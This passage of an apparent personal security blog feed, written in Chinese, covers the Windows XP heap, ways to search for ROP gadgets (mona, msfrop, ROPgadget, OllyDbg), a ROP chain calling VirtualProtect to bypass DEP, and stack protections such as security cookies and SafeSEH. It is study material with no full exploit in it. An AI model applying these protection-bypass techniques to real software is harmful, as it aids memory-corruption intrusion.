heap ;</span><br><span class="line">heap.push(<span class="hljs-number">1</span>) ; <span class="hljs-comment">//&#x63D2;&#x5165;&#x5143;&#x7D20;</span></span><br><span class="line">heap.top() ; <span class="hljs-comment">//&#x53D6;&#x51FA;&#x6700;&#x503C;</span></span><br><span class="line">heap.pop() ; <span class="hljs-comment">//&#x5220;&#x9664;&#x6700;&#x503C;</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x539F;&#x578B;"><a href="#&#x539F;&#x578B;" class="headerlink" title="&#x539F;&#x578B;"></a>&#x539F;&#x578B;</h2><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">priority_queue&lt;Type, Container, Functional&gt;</span><br></pre></td></tr></tbody></table></figure><br>Type&#xFF1A; &#x57FA;&#x672C;&#x5143;&#x7D20;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x7C7B;&#x578B;<br>Container&#xFF1A;&#x4FDD;&#x5B58;&#x6570;&#x636E;&#x7684;&#x5BB9;&#x5668;&#xFF0C;&#x5FC5;&#x987B;&#x662F;&#x6570;&#x7EC4;&#x5B9E;&#x73B0;&#x7684;&#x5BB9;&#x5668;&#xFF0C;&#x6BD4;&#x5982;vector&#xFF0C;deque&#xFF0C;&#x9ED8;&#x8BA4;&#x7528;&#x7684;&#x662F;vector<br>Functional&#xFF1A;&#x6BD4;&#x8F83;&#x65B9;&#x6CD5;<p></p><h2 id="&#x53C2;&#x8003;"><a href="#&#x53C2;&#x8003;" class="headerlink" title="&#x53C2;&#x8003;"></a>&#x53C2;&#x8003;</h2><p><a href="http://www.cnblogs.com/flyoung2008/articles/2136485.html" target="_blank" rel="noopener">http://www.cnblogs.com/flyoung2008/articles/2136485.html</a></p></body></html>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xp heap</title>
      <link href="/2017/01/19/windows-heap/"/>
      <url>/2017/01/19/windows-heap/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>windbg &#x8C03;&#x8BD5;&#x6765;&#x770B;XpSp3 heap</p><h2 id="&#x57FA;&#x672C;&#x6982;&#x5FF5;"><a href="#&#x57FA;&#x672C;&#x6982;&#x5FF5;" class="headerlink" title="&#x57FA;&#x672C;&#x6982;&#x5FF5;"></a>&#x57FA;&#x672C;&#x6982;&#x5FF5;</h2><p><em>&#x5806;</em> &#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x80FD;&#x6709;&#x591A;&#x4E2A;&#x5806;&#xFF0C;+0x58&#x6307;&#x5411;&#x5806;&#x4E2D;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5806;&#x6BB5;&#xFF0C;C++&#x4E00;&#x822C;&#x7528;HeapCreate&#x521B;&#x5EFA;&#xFF0C;&#x6BCF;&#x4E2A;&#x5806;&#x81F3;&#x5C11;&#x6709;&#x4E00;&#x4E2A;&#x5806;&#x6BB5;<br><em>&#x5806;&#x6BB5;</em> &#x4E00;&#x4E2A;&#x5806;&#x6700;&#x591A;&#x6709;64&#x4E2A;&#x5806;&#x6BB5;&#xFF0C;+0x20(FirstEntry)&#x6307;&#x5411;&#x5806;&#x6BB5;&#x4E2D;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5806;&#x5757;&#xFF0C;C++&#x4E00;&#x822C;&#x7528;HeapAlloc&#x521B;&#x5EFA;<br><em>&#x5806;&#x5757;</em> &#x5B9E;&#x9645;&#x7684;&#x5806;&#x5185;&#x5B58;&#x4F7F;&#x7528;<br>&#x5173;&#x4E8E;&#x5806;&#x7684;&#x5B9E;&#x9645;&#x5206;&#x914D;&#x4F7F;&#x7528;<br>&#x5806;&#x7BA1;&#x7406;&#x5668;&#x901A;&#x8FC7;Windows&#x865A;&#x62DF;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x5668;&#x5206;&#x914D;&#x4E00;&#x5927;&#x5757;&#x5185;&#x5B58;(&#x5806;&#x6BB5;)&#xFF0C;&#x8FD9;&#x5757;&#x5185;&#x5B58;&#x5C06;&#x88AB;&#x5206;&#x4E3A;&#x5927;&#x5C0F;&#x4E0D;&#x540C;&#x7684;&#x5806;&#x5757;&#x6765;&#x6EE1;&#x8DB3;&#x5B9E;&#x9645;&#x7684;&#x5206;&#x914D;&#x3002; &#x5F53;&#x4E00;&#x4E2A;&#x5806;&#x6BB5;&#x8017;&#x5C3D;&#x6240;&#x6709;&#x7A7A;&#x95F4;&#x540E;&#xFF0C;&#x5806;&#x7BA1;&#x7406;&#x5668;&#x5C06;&#x521B;&#x5EFA;&#x53E6;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x5806;&#x6BB5;&#x3002;</p><h2 id="&#x5806;&#x7BA1;&#x7406;&#x6D41;&#x7A0B;"><a href="#&#x5806;&#x7BA1;&#x7406;&#x6D41;&#x7A0B;" class="headerlink" title="&#x5806;&#x7BA1;&#x7406;&#x6D41;&#x7A0B;"></a>&#x5806;&#x7BA1;&#x7406;&#x6D41;&#x7A0B;</h2><p>&#x5806;&#x7BA1;&#x7406;&#x5305;&#x62EC;&#x524D;&#x7AEF;&#x5806;&#x7BA1;&#x7406;&#x548C;&#x6838;&#x5FC3;&#x5806;&#x5C42;&#x7BA1;&#x7406;&#x4E24;&#x4E2A;&#x90E8;&#x5206;&#xFF0C;<strong>&#x524D;&#x7AEF;&#x5806;&#x7BA1;&#x7406;</strong> &#x4E3B;&#x8981;&#x7528;&#x4E8E;&#x5FEB;&#x901F;&#x7684;&#x5806;&#x5757;&#x5206;&#x914D;&#x4EE5;&#x53CA;&#x88AB;&#x91CA;&#x653E;&#x7684;&#x5806;&#x5757;&#x7684;&#x91CD;&#x5229;&#x7528;&#xFF0C;&#x56E0;&#x6B64;&#x5728;&#x7533;&#x8BF7;&#x4E00;&#x4E2A;&#x5806;&#x5757;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x9996;&#x5148;&#x67E5;&#x8BE2;&#x524D;&#x7AEF;&#x5806;&#x90E8;&#x5206;&#x6709;&#x6CA1;&#x6709;&#x53EF;&#x7528;&#x7684;&#x5806;&#x5757;&#xFF0C;&#x5F53;&#x6CA1;&#x6709;&#x7684;&#x4E4B;&#x540E;&#x624D;&#x4F1A;&#x53BB;&#x67E5;&#x770B;&#x6838;&#x5FC3;&#x5806;&#x7BA1;&#x7406;&#x3002;<br><strong>&#x524D;&#x7AEF;&#x5806;&#x7BA1;&#x7406;</strong> &#x5305;&#x62EC;Lookaside list&#xFF08;&#x5FEB;&#x8868;&#xFF09;&#xFF0C;&#x4F4E;&#x788E;&#x7247;&#x5806;&#x3002;</p><p><strong>&#x7533;&#x8BF7;&#x5806;&#x5757;</strong> &#x7533;&#x8BF7;&#x4E00;&#x4E2A;&#x5806;&#x5757;&#xFF0C;&#x9996;&#x5148;&#x67E5;&#x770B;&#x5FEB;&#x8868;&#x4E2D;&#x662F;&#x5426;&#x6709;&#x5408;&#x9002;&#x7684;&#x5806;&#x5757;&#xFF0C;&#x82E5;&#x6709;&#x5219;&#x5206;&#x914D;&#xFF0C;&#x82E5;&#x6CA1;&#x6709;&#x5219;&#x7EE7;&#x7EED;&#x67E5;&#x770B;freelist&#x4E2D;&#x662F;&#x5426;&#x6709;&#x5408;&#x9002;&#x7684;&#x5806;&#x5757;&#xFF0C;&#x82E5;&#x6CA1;&#x6709;&#x5219;&#x6B63;&#x5E38;&#x5212;&#x5206;&#x4E00;&#x4E2A;&#x7A7A;&#x5806;&#x5757;&#x5206;&#x914D;&#x3002;</p></body></html>]]></content>
      
      
      <categories>
          
          <category> vuls </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>search rop gadgets</title>
      <link href="/2017/01/06/search-rop-gadgets/"/>
      <url>/2017/01/06/search-rop-gadgets/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>&#x63D0;&#x4F9B;&#x51E0;&#x79CD;rop gadgets&#x641C;&#x7D22;&#x7684;&#x65B9;&#x6CD5;, &#x4E3B;&#x8981;&#x6765;&#x6E90;&#x4E8E;&#x7F51;&#x4E0A;&#x7684;blog, &#x4E3B;&#x8981;&#x662F;&#x603B;&#x7ED3;&#x4E00;&#x4E0B;</p><h2 id="Immunity-Debugger-Mona"><a href="#Immunity-Debugger-Mona" class="headerlink" title="Immunity Debugger Mona"></a>Immunity Debugger Mona</h2><p>&#x56E0;&#x4E3A;&#x4EE5;&#x524D;&#x4E00;&#x76F4;&#x4F7F;&#x7528;&#x7684;&#x662F;OD, &#x6CA1;&#x6709;&#x4F7F;&#x7528;Immunity Debugger, &#x56E0;&#x6B64;&#x6CA1;&#x6709;&#x5B9E;&#x9645;&#x5C1D;&#x8BD5;, &#x63A8;&#x8350;&#x4E00;&#x7BC7;Blog.<br><a href="https://huirong.github.io/2015/12/18/mona/" target="_blank" rel="noopener">https://huirong.github.io/2015/12/18/mona/</a><br>&#x641C;&#x7D22;DLL&#x4E2D;&#x7684;ROP&#x94FE;<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona rop -m msvcrt.dll</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="MSFrop-metasploit&#x7684;&#x4E00;&#x4E2A;&#x5C0F;&#x5DE5;&#x5177;"><a href="#MSFrop-metasploit&#x7684;&#x4E00;&#x4E2A;&#x5C0F;&#x5DE5;&#x5177;" class="headerlink" title="MSFrop metasploit&#x7684;&#x4E00;&#x4E2A;&#x5C0F;&#x5DE5;&#x5177;"></a>MSFrop metasploit&#x7684;&#x4E00;&#x4E2A;&#x5C0F;&#x5DE5;&#x5177;</h2><p>&#x8FD9;&#x4E2A;&#x5728;Kali&#x4E0A;&#x5C31;&#x6709;, &#x53EF;&#x4EE5;&#x5BF9;DLL&#x8FDB;&#x884C;&#x641C;&#x7D22;, &#x4F7F;&#x7528;&#x4E5F;&#x5F88;&#x65B9;&#x4FBF;, &#x53EF;&#x4EE5;&#x53C2;&#x8003;:<br><a href="https://www.offensive-security.com/metasploit-unleashed/Msfrop/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/Msfrop/</a></p><h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><p>&#x57FA;&#x672C;&#x7528;&#x6CD5;<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary c --only <span class="hljs-string">&quot;pop|pop|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040071c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040071e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400720 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400722 : pop r15 ; ret</span><br><span class="line">0x000000000040071b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040071f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005b0 : pop rbp ; ret</span><br><span class="line">0x0000000000400723 : pop rdi ; ret</span><br><span class="line">0x0000000000400721 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040071d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004004d1 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 11</span><br></pre></td></tr></tbody></table></figure><br>&#x5B89;&#x88C5;&amp;&#x8BE6;&#x7EC6;&#x4F7F;&#x7528;&#x53C2;&#x8003;<br><a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">https://github.com/JonathanSalwan/ROPgadget</a><p></p><h2 id="OD&#x4E2D;&#x7684;&#x641C;&#x7D22;"><a href="#OD&#x4E2D;&#x7684;&#x641C;&#x7D22;" class="headerlink" title="OD&#x4E2D;&#x7684;&#x641C;&#x7D22;"></a>OD&#x4E2D;&#x7684;&#x641C;&#x7D22;</h2><p>&#x56E0;&#x4E3A;&#x4E00;&#x76F4;&#x7528;&#x7684;OD&#x8C03;&#x8BD5;, &#x6240;&#x4EE5;&#x7528;&#x8FD9;&#x4E2A;&#x6BD4;&#x8F83;&#x65B9;&#x4FBF;, &#x7ED9;&#x51FA;&#x51E0;&#x4E2A;&#x4F7F;&#x7528;&#x56FE;&#x5C31;&#x6BD4;&#x8F83;&#x6E05;&#x695A;&#x4E86;.</p><p><img src="/images/search-rop-gadgets/od_gadgets1.PNG" alt="&#x70B9;&#x51FB;e&#x67E5;&#x770B;&#x52A0;&#x8F7D;&#x7684;DLL"><br><img src="/images/search-rop-gadgets/od_gadgets2.PNG" alt="&#x9009;&#x4E2D;&#x5176;&#x4E2D;&#x4E00;&#x4E2A;&#x9700;&#x8981;&#x641C;&#x7D22;&#x7684;DLL"><br><img src="/images/search-rop-gadgets/od_gadgets3.PNG" alt="&#x53F3;&#x952E;-&#x67E5;&#x627E;-&#x6240;&#x6709;&#x547D;&#x4EE4;&#x5E8F;&#x5217;"><br><img src="/images/search-rop-gadgets/od_gadgets4.PNG" alt="&#x8F93;&#x5165;&#x67E5;&#x627E;&#x7684;&#x8BED;&#x53E5;&#x8BED;&#x6CD5;"><br><img src="/images/search-rop-gadgets/od_gadgets5.PNG" alt="&#x70B9;&#x51FB;&#x67E5;&#x627E;"><br><img src="/images/search-rop-gadgets/od_gadgets6.PNG" alt="&#x67E5;&#x770B;&#x5177;&#x4F53;&#x7684;&#x8BED;&#x53E5;"></p><p>&#x8BED;&#x6CD5;&#x5F88;&#x7B80;&#x6D01;<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">R8, R16, R32 <span class="hljs-keyword">for</span> any 8, 16, 32 bit register respectively.</span><br><span class="line">CONST <span class="hljs-keyword">for</span> any constant</span><br><span class="line">JCC <span class="hljs-keyword">for</span> any conditional jump</span><br><span class="line">ANY n <span class="hljs-keyword">for</span> any 0..n commands</span><br></pre></td></tr></tbody></table></figure><br>&#x53C2;&#x8003; <a href="http://auntitled.blogspot.com/2010/12/use-ollydbg-to-find-rop-gadgets.html" target="_blank" rel="noopener">http://auntitled.blogspot.com/2010/12/use-ollydbg-to-find-rop-gadgets.html</a><p></p></body></html>]]></content>
      
      
      <categories>
          
          <category> vuls </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fuzz methods &amp; tools</title>
      <link href="/2017/01/06/fuzzmethods-tools/"/>
      <url>/2017/01/06/fuzzmethods-tools/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>&#x4E3B;&#x8981;&#x4ECB;&#x7ECD;&#x51E0;&#x79CD;&#x4E3B;&#x6D41;&#x7684;Fuzz&#x65B9;&#x5F0F;&#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684;Fuzz&#x5DE5;&#x5177;</p><h2 id="&#x57FA;&#x4E8E;&#x6587;&#x4EF6;&#x683C;&#x5F0F;"><a href="#&#x57FA;&#x4E8E;&#x6587;&#x4EF6;&#x683C;&#x5F0F;" class="headerlink" title="&#x57FA;&#x4E8E;&#x6587;&#x4EF6;&#x683C;&#x5F0F;"></a>&#x57FA;&#x4E8E;&#x6587;&#x4EF6;&#x683C;&#x5F0F;</h2><h2 id="&#x57FA;&#x4E8E;&#x8986;&#x76D6;&#x7387;&#x7B49;&#x53CD;&#x9988;"><a href="#&#x57FA;&#x4E8E;&#x8986;&#x76D6;&#x7387;&#x7B49;&#x53CD;&#x9988;" class="headerlink" title="&#x57FA;&#x4E8E;&#x8986;&#x76D6;&#x7387;&#x7B49;&#x53CD;&#x9988;"></a>&#x57FA;&#x4E8E;&#x8986;&#x76D6;&#x7387;&#x7B49;&#x53CD;&#x9988;</h2><h2 id="&#x57FA;&#x4E8E;&#x7279;&#x5B9A;&#x8F6F;&#x4EF6;"><a href="#&#x57FA;&#x4E8E;&#x7279;&#x5B9A;&#x8F6F;&#x4EF6;" class="headerlink" title="&#x57FA;&#x4E8E;&#x7279;&#x5B9A;&#x8F6F;&#x4EF6;"></a>&#x57FA;&#x4E8E;&#x7279;&#x5B9A;&#x8F6F;&#x4EF6;</h2></body></html>]]></content>
      
      
      <categories>
          
          <category> fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP - 绕过DEP VirtualProtect</title>
      <link href="/2017/01/04/dep-rop/"/>
      <url>/2017/01/04/dep-rop/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="About-DEP-amp-ROP"><a href="#About-DEP-amp-ROP" class="headerlink" title="About DEP &amp; ROP"></a>About DEP &amp; ROP</h2><p>DEP-&#x6570;&#x636E;&#x6267;&#x884C;&#x4FDD;&#x62A4;, &#x8F6F;&#x4EF6;DEP&#x53C8;&#x79F0;&#x4E3A;Safe SEH, &#x786C;&#x4EF6;DEP&#x4E3B;&#x8981;&#x601D;&#x60F3;&#x662F;&#x5C06;&#x4E00;&#x90E8;&#x5206;&#x5185;&#x5B58;&#x6307;&#x5B9A;&#x4E3A;&#x53EF;&#x5199;&#x4F46;&#x4E0D;&#x53EF;&#x5B9E;&#x884C;, &#x5BFC;&#x81F4;&#x6700;&#x7EC8;&#x7684;shellcode&#x65E0;&#x6CD5;&#x6267;&#x884C;. &#x8FD9;&#x91CC;&#x4ECB;&#x7ECD;&#x7684;&#x662F;&#x5F53;&#x5BF9;&#x6808;&#x6EA2;&#x51FA;&#x8FDB;&#x884C;&#x5229;&#x7528;&#x65F6;, &#x5C06;shellcode&#x5E03;&#x7F6E;&#x5728;&#x6808;&#x533A;, &#x56E0;&#x4E3A;DEP&#x7684;&#x5B58;&#x5728;&#x5BFC;&#x81F4;&#x6808;&#x533A;&#x7684;shellcode&#x4E0D;&#x80FD;&#x6267;&#x884C;, &#x6B64;&#x65F6;&#x5C31;&#x4F7F;&#x7528;ROP&#x94FE;&#x6765;&#x5904;&#x7406;DEP&#x7684;&#x60C5;&#x51B5;&#x4E86;.</p><h2 id="&#x73AF;&#x5883;"><a href="#&#x73AF;&#x5883;" class="headerlink" title="&#x73AF;&#x5883;"></a>&#x73AF;&#x5883;</h2><p>WinXp Sp3 &#x5F00;&#x542F;DEP<br>&#x7F16;&#x8BD1;&#x5668; VS2015 &#x9ED8;&#x8BA4;&#x5F00;&#x542F;DEP</p><h2 id="&#x6838;&#x5FC3;&#x601D;&#x60F3;"><a href="#&#x6838;&#x5FC3;&#x601D;&#x60F3;" class="headerlink" title="&#x6838;&#x5FC3;&#x601D;&#x60F3;"></a>&#x6838;&#x5FC3;&#x601D;&#x60F3;</h2><p>&#x6838;&#x5FC3;&#x601D;&#x60F3;&#x5C31;&#x662F;&#x901A;&#x8FC7;&#x4E00;&#x7CFB;&#x5217;&#x7684;&#x7CFB;&#x7EDF;&#x6307;&#x4EE4;, &#x4F7F;&#x5F97;&#x6267;&#x884C;Windows&#x7684;VirtualProtect&#x51FD;&#x6570;(&#x4E5F;&#x6709;&#x5176;&#x4ED6;&#x7684;&#x65B9;&#x5F0F;), &#x8BE5;&#x51FD;&#x6570;&#x7684;&#x4E3B;&#x8981;&#x529F;&#x80FD;&#x662F;&#x80FD;&#x591F;&#x6539;&#x53D8;&#x6307;&#x5B9A;&#x5185;&#x5B58;&#x5730;&#x5740;&#x7684;&#x5185;&#x5B58;&#x5C5E;&#x6027;, &#x8FD9;&#x6837;&#x80FD;&#x591F;&#x4F7F;&#x5F97;&#x8BE5;&#x90E8;&#x5206;&#x5185;&#x5B58;&#x5730;&#x5740;&#x53D8;&#x5F97;&#x53EF;&#x4EE5;&#x6267;&#x884C;. &#x90A3;&#x4E48;&#x901A;&#x8FC7;&#x8C03;&#x7528;&#x8BE5;&#x51FD;&#x6570;&#x4F7F;&#x5F97;shellcode&#x90E8;&#x5206;&#x4EE3;&#x7801;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x5373;&#x53EF;&#x8FBE;&#x5230;&#x7ED5;&#x8FC7;DEP&#x7684;&#x6548;&#x679C;. VirtualProtect:<br>kernel32.dll &#x4E00;&#x822C;Windows&#x7A0B;&#x5E8F;&#x90FD;&#x4F1A;&#x52A0;&#x8F7D;&#x8BE5;DLL</p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">BOOL WINAPI <span class="hljs-title">VirtualProtect</span><span class="hljs-params">(</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">  _In_  LPVOID lpAddress,  <span class="hljs-comment">//&#x4FEE;&#x6539;&#x7684;&#x5185;&#x5B58;&#x5176;&#x5B9E;&#x5730;&#x5740;</span></span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">  _In_  SIZE_T dwSize,<span class="hljs-comment">//&#x4FEE;&#x6539;&#x7684;&#x5185;&#x5B58;&#x533A;&#x57DF;&#x5927;&#x5C0F;</span></span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">  _In_  DWORD  flNewProtect,<span class="hljs-comment">//&#x4FEE;&#x6539;&#x540E;&#x7684;&#x5185;&#x5B58;&#x5C5E;&#x6027; 0x40&#x8868;&#x793A;&#x53EF;&#x6267;&#x884C;, &#x8BE6;&#x7EC6;&#x53EF;&#x67E5;&#x770B;MSDN</span></span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">  _Out_ PDWORD lpflOldProtect<span class="hljs-comment">//out &#x4FDD;&#x5B58;&#x4EE5;&#x524D;&#x7684;&#x5185;&#x5B58;&#x5C5E;&#x6027;</span></span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id><a href="#" class="headerlink" title></a></h2><p>VirtualProtect()&#x7684;&#x6307;&#x9488;&#x8986;&#x76D6;EIP, &#x5E76;&#x4E14;&#x6211;&#x4EEC;&#x4F1A;&#x5C06;5&#x4E2A;&#x9700;&#x8981;&#x7684;&#x53C2;&#x6570;&#x653E;&#x5230;&#x6808;&#x9876;, &#x6A21;&#x62DF;&#x51FD;&#x6570;&#x7684;&#x8C03;&#x7528;, &#x5148;push&#x56DB;&#x4E2A;&#x53C2;&#x6570;, &#x7136;&#x540E;push ret, &#x56E0;&#x6B64;&#x8C03;&#x7528;VirtualProtect&#x4E4B;&#x524D;&#x51FD;&#x6570;&#x7684;&#x6808;&#x9876;&#x5E03;&#x5C40;&#x4E3A;&#x5982;&#x4E0B;:</p></body></html>]]></content>
      
      
      <categories>
          
          <category> vuls </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BuTags - a chrome plugin</title>
      <link href="/2017/01/04/butags/"/>
      <url>/2017/01/04/butags/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="About-BuTags"><a href="#About-BuTags" class="headerlink" title="About BuTags"></a>About BuTags</h2><p>&#x5143;&#x65E6;&#x82B1;&#x4E86;&#x4E00;&#x5929;&#x5DE6;&#x53F3;&#x4ECE;&#x96F6;&#x5F00;&#x59CB;&#x5199;&#x4E86;&#x4E00;&#x4E2A;chrome&#x63D2;&#x4EF6;, &#x5199;&#x8FD9;&#x4E2A;&#x7684;&#x4E3B;&#x8981;&#x8003;&#x8651;&#x662F;&#x5E73;&#x65F6;&#x5728;&#x7535;&#x8111;&#x5173;&#x673A;&#x7684;&#x4E4B;&#x524D;chrome&#x4E2D;&#x6253;&#x5F00;&#x4E86;&#x4E00;&#x4E9B;&#x6807;&#x7B7E;, &#x56E0;&#x4E3A;&#x662F;&#x4E34;&#x65F6;&#x7684;, &#x6240;&#x4EE5;&#x5168;&#x90E8;&#x653E;&#x5728;&#x4E66;&#x7B7E;&#x4E2D;&#x4F1A;&#x6BD4;&#x8F83;&#x4E71;. &#x56E0;&#x6B64;&#x60F3;&#x5C06;&#x6240;&#x6709;&#x7684;&#x6807;&#x7B7E;&#x4FDD;&#x5B58;, &#x7136;&#x540E;&#x4E0B;&#x6B21;&#x6253;&#x5F00;&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x65F6;&#x5019;&#x6062;&#x590D;. &#x4ECA;&#x5929;&#x804A;&#x7740;&#x7684;&#x65F6;&#x5019;&#x53D1;&#x73B0;&#x5DF2;&#x7ECF;&#x5B58;&#x5728;&#x8FD9;&#x7C7B;&#x529F;&#x80FD;&#x7684;&#x63D2;&#x4EF6;&#x4E86;&gt;_&lt; (OneTab)<br>&#x6BD4;&#x8F83;&#x5C34;&#x5C2C;&#x4E86;, &#x754C;&#x9762;&#x529F;&#x80FD;&#x65B9;&#x9762;&#x90FD;&#x6BD4;&#x6211;&#x7684;&#x597D;. &#x597D;&#x5427;, &#x8FD8;&#x662F;&#x4ECB;&#x7ECD;&#x4E0B;&#x6211;&#x7684;&#x8FD9;&#x4E2A;&#x63D2;&#x4EF6;&#x7684;&#x4E3B;&#x8981;&#x529F;&#x80FD;&#x548C;&#x601D;&#x60F3;&#x5427;, &#x5305;&#x542B;&#x4E24;&#x4E2A;&#x529F;&#x80FD;, &#x4FDD;&#x5B58;&#x5F53;&#x524D;Window&#x7684;&#x6240;&#x6709;tabs, &#x7136;&#x540E;&#x4E0D;&#x8BBA;&#x662F;&#x5173;&#x673A;&#x6216;&#x8005;&#x662F;&#x91CD;&#x65B0;&#x542F;&#x52A8;&#x6D4F;&#x89C8;&#x5668;, &#x90FD;&#x53EF;&#x4EE5;&#x70B9;&#x51FB;&#x6062;&#x590D;&#x5C06;&#x6240;&#x6709;&#x6807;&#x7B7E;&#x6062;&#x590D;.</p><h2 id><a href="#" class="headerlink" title></a></h2></body></html>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buffer overflow</title>
      <link href="/2017/01/03/buffer-overflow/"/>
      <url>/2017/01/03/buffer-overflow/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h2><p>&#x5E38;&#x89C1;&#x7684;&#x5B89;&#x5168;&#x673A;&#x5236;&#x4EE5;&#x53CA;&#x76F8;&#x5173;&#x7ED5;&#x8FC7;&#x65B9;&#x6CD5;</p><h3 id="security-cookies"><a href="#security-cookies" class="headerlink" title="security cookies"></a>security cookies</h3><p>&#x7F16;&#x8BD1;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x5728;&#x8FD0;&#x884C;&#x6808;RET&#x7684;&#x4E0A;&#x9762;&#x52A0;&#x4E0A;&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x7684;4&#x5B57;&#x8282;&#x6570;&#x503C;(32&#x4F4D;&#x7CFB;&#x7EDF;), &#x8BE5;&#x503C;&#x6765;&#x81EA;&#x4E8E;(.data&#x8282;&#x7684;&#x524D;&#x56DB;&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x5E76;&#x901A;&#x8FC7;&#x4E00;&#x5B9A;&#x7684;&#x7B97;&#x6CD5;&#x8BA1;&#x7B97;), &#x5728;&#x51FD;&#x6570;&#x8FD0;&#x884C;&#x6808;&#x524D;&#x9762;&#x4F1A;&#x5C06;&#x8BE5;&#x503C;&#x4E0E;esp&#x8FDB;&#x884C;&#x4EA6;&#x6216;&#x5E76;&#x653E;&#x7F6E;&#x5728;&#x6808;&#x4E2D;, &#x5728;&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x524D;&#x4F1A;&#x5BF9;&#x8BE5;&#x503C;&#x8FDB;&#x884C;&#x68C0;&#x67E5;. &#x5982;&#x679C;&#x8BE5;&#x503C;&#x88AB;&#x4FEE;&#x6539;&#x5C06;&#x76F4;&#x63A5;&#x5F02;&#x5E38;.<br>** &#x7A33;&#x5B9A;&#x5229;&#x7528;&#x4E3B;&#x8981;&#x601D;&#x60F3;&#x662F;&#x68C0;&#x67E5;&#x524D;&#x5229;&#x7528;(SEH, &#x865A;&#x8868;) **<br>Linux -fno-stack-protector</p><h3 id="safeseh"><a href="#safeseh" class="headerlink" title="safeseh"></a>safeseh</h3><p>&#x5728;&#x5F02;&#x5E38;&#x5904;&#x7406;&#x5668;&#x88AB;&#x8C03;&#x7528;&#x65F6;, &#x4F1A;&#x5148;&#x68C0;&#x67E5;, 